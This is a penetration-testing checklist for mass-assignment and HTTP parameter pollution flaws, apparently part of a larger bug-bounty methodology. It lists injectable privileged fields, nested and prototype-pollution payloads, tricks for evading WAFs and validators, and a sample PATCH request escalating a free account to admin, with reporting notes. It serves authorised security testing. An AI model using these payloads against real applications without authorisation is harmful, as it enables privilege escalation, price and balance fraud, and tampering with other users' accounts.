# Mass Assignment / Auto-Binding & HPP

**What it is:** The app binds request params straight to object fields. Send extra/unexpected fields → set attributes you should not control.

## Test steps
- [ ] Add privileged fields to create/update bodies:
```
"role":"admin"   "isAdmin":true   "verified":true   "plan":"pro"
"balance":99999  "price":0        "user_id":<victim>  "email_verified":true
"status":"approved"  "discount":100  "is_staff":true
```
- [ ] Discover field names from GET responses, JS, API docs — then submit them back on write.
- [ ] Nested objects: `{"user":{"role":"admin"}}`.
- [ ] Array/type confusion to slip past filters.
- [ ] Set another user's id/owner on a resource you create.

## HTTP Parameter Pollution (HPP)
- [ ] Duplicate params: `?role=user&role=admin` (server picks last/first/concats).
- [ ] Body + query same name; JSON duplicate keys `{"a":1,"a":2}`.
- [ ] Split values across pollution to bypass WAF/validation.
- [ ] Use HPP to add a second coupon, second recipient, override price.

## Impact
Privilege escalation, price/balance manipulation, verified-status bypass, IDOR-write.

## 🎯 PoC — Request → Response

**Inject `role` into a self-update the UI never exposes:**
```http
PATCH /api/v2/account/profile HTTP/2
Host: api.target.com
Authorization: Bearer <free-user>
Content-Type: application/json

{"display_name":"alex","role":"admin","email_verified":true}
```
```http
HTTP/2 200 OK
Content-Type: application/json

{"id":"3a1f...","display_name":"alex","role":"admin","email_verified":true}
```
**Independent confirmation (interception off, fresh request):**
```http
GET /api/v2/account/me HTTP/2
Host: api.target.com
Authorization: Bearer <free-user>
```
```http
HTTP/2 200 OK
{"id":"3a1f...","role":"admin"}     ← server persisted it = real privilege escalation
```

## Deep cuts — framework binders & field discovery
- [ ] **Framework tells (know the default binder):** Rails `permit`/`params` (strong-params gaps), Spring `@ModelAttribute`/`DataBinder` (no `setAllowedFields`), Django `fields='__all__'`/ModelForm, Laravel `$fillable` vs `$guarded=[]`, Mongoose/Sequelize bulk `create(req.body)`, .NET `[Bind]`/overposting, Express `Object.assign(obj, req.body)`. Each blindly binds unexpected keys.
- [ ] **Field discovery → write-back:** read every property from a GET/response/JS/OpenAPI, then submit them on create/update. The hidden gold: `role isAdmin is_staff verified email_verified plan balance credits price discount owner_id user_id tenant_id status approved kyc_level id created_at is_deleted`.
- [ ] **Create vs update asymmetry (second-order):** a field ignored on `POST /create` is honored on `PATCH /update` (or vice-versa) — test both. Also step-1 create then step-2 "finalize" honoring the field.
- [ ] **Nested / dotted / JSON-merge-patch:** `{"user":{"role":"admin"}}`, `{"profile.role":"admin"}`, `{"__proto__":{"role":"admin"}}` (prototype pollution, `09-advanced/02`), and `application/merge-patch+json` / JSON-Patch `[{"op":"add","path":"/role","value":"admin"}]`.
- [ ] **Type/array coercion to dodge validators:** `{"role":["admin"]}`, `{"verified":"true"}` vs `true`, `{"price":"0"}` where a scalar guard checks type not value.
- [ ] **Ownership/IDOR-write:** set `owner_id`/`user_id`/`account_id` to a victim on a resource you create → plant objects in their account (chains to second-order IDOR).
- [ ] **GraphQL input objects & bulk endpoints:** `updateUser(input:{role:ADMIN})`, `bulkUpdate([{id,role}])` — same bug, different shape (`07-api/02`).
- [ ] **HPP layer split (repeat):** `role=user&role=admin` where validator reads first, ORM reads last (`09-advanced/04`).

## Report notes
Show the extra field taking effect (e.g. account now `admin`) with an independent GET (interception off). Diff the object before/after. Name the binder/field and whether it hit on create or update.
